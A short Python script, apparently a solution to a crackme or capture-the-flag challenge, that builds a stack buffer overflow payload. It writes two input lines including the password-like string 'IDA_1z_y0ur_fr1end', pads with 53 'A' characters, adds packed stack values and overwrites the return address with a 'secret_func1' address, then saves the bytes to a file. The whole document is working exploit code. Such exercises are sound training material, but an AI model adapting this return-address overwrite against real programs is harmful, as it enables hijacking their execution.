import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

offset = 53

secret_func1_addr = 0x4013e6

payload=''
payload+='NOP\n'
payload+='IDA_1z_y0ur_fr1end\n'

payload += 'A' * offset

payload += dw(0x00000194)

payload += dw(0x0022ff68)
payload += dw(0x0022ff68)
payload += dw(0x0022ff68)

payload += dw(secret_func1_addr)
with open('payload_a', 'wb') as f:
    f.write(payload)
